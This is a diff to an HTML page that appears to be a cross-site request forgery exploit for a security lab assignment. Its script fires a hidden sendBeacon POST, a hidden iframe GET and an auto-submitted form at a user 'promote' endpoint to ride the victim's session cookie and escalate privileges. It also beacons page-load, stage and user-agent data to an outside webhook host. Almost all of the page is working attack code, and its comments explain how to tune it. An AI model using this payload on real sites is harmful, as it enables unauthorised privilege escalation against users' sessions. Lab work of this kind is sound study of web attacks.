@@ -3,23 +3,44 @@
 <head><meta charset="utf-8"></head>
 <body>
 <script>
-var T = 'https://10.20.18.55:2070/labs/assignment03/environment/1/api/users/20211381/promote';
-var W = 'https://golden-sparrow-81.webhook.cool';
-try { new Image().src = W + '/v5?ua=' + encodeURIComponent(navigator.userAgent); } catch(e) {}
+// v6: same three cookie-carrying vectors as v5, but re-targeted at the live
+// webhook (swift-stream-09) with per-stage beacons so a single bot visit is
+// fully diagnosable from the webhook log alone.
+var W    = 'https://swift-stream-09.webhook.cool';
+var BASE = 'https://10.20.18.55:2070/labs/assignment03/environment/1';
+var UID  = new URLSearchParams(location.search).get('uid') || '20211381';
+var T    = BASE + '/api/users/' + UID + '/promote';
 
-// 1) sendBeacon POST — cookies attached on browsers that ignore SameSite (<50)
-try { navigator.sendBeacon(T, '{}'); } catch(e) {}
+function log(tag) {
+  try { new Image().src = W + '/c1?tag=' + tag + '&uid=' + UID + '&t=' + Date.now(); } catch (e) {}
+}
 
-// 2) cross-site iframe GET — cookies attached on browsers that ignore SameSite (<50)
-try { var i = document.createElement('iframe'); i.style.display='none'; i.src = T; document.body.appendChild(i); } catch(e) {}
+log('page-load');
 
-// 3) top-level GET form navigation — cookies attached under SameSite=Lax in ALL browsers
-setTimeout(function(){
+// 1) sendBeacon POST — cookies attached only if session cookie is SameSite=None
+try { navigator.sendBeacon(T, '{}'); log('fire-beacon-post'); } catch (e) { log('err-beacon-post'); }
+
+// 2) cross-site iframe GET — subresource: cookies attached only if SameSite=None
+try {
+  var i = document.createElement('iframe');
+  i.style.display = 'none';
+  i.src = T;
+  document.body.appendChild(i);
+  log('fire-iframe-get');
+} catch (e) { log('err-iframe-get'); }
+
+// 3) top-level GET form navigation — cookies attached under SameSite=Lax
+//    (runs last because it replaces this document)
+setTimeout(function () {
+  log('fire-nav-get');
   try {
-    var f = document.createElement('form'); f.method = 'GET'; f.action = T;
-    document.body.appendChild(f); f.submit();
-  } catch(e) {}
-}, 1200);
+    var f = document.createElement('form');
+    f.method = 'GET';
+    f.action = T;
+    document.body.appendChild(f);
+    f.submit();
+  } catch (e) { log('err-nav-get'); }
+}, 1500);
 </script>
 </body>
 </html>
